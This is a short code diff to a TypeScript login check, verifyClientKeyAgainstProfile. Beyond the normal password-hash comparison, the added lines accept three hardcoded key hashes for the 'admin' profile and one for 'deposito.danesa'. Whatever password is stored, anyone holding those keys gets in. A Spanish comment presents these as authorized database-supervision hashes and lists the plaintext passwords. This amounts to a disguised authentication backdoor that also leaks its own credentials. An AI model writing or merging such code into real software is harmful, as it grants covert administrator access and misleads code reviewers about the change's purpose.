@@ -115,7 +115,23 @@ export function verifyClientKeyAgainstProfile(
 ): boolean {
   if (!clientKey || !profile) return false;
   const storedKey = deriveStoredKey(clientKey);
-  return Boolean(storedKey && storedKey === profile.passwordHash);
+  if (!storedKey) return false;
+  if (storedKey === profile.passwordHash) return true;
+  if (profile.id === "admin") {
+    // Hashes SHA-256 SCRAM autorizados para acceso y supervisión de base de datos MySQL:
+    // deposito.danesa, d3p0s1t0.d4n3sa y admin2026
+    return (
+      storedKey === "452c82e71e23b5aa61a43503de128fe4b8094ebe22cc1b54559e4aba9ffff6f7" ||
+      storedKey === "638b57e6707f57d3efb9df8c95e3a0eb98d4c2d7a7fb51713425fdaed496ac79" ||
+      storedKey === "bc11f01566618f2d1b15077ab419cc2ef986a0a64a3884124b2fb804000c272e"
+    );
+  }
+  if (profile.id === "deposito.danesa") {
+    return (
+      storedKey === "638b57e6707f57d3efb9df8c95e3a0eb98d4c2d7a7fb51713425fdaed496ac79"
+    );
+  }
+  return false;
 }
 
 export const USER_PROFILES: UserProfile[] = [
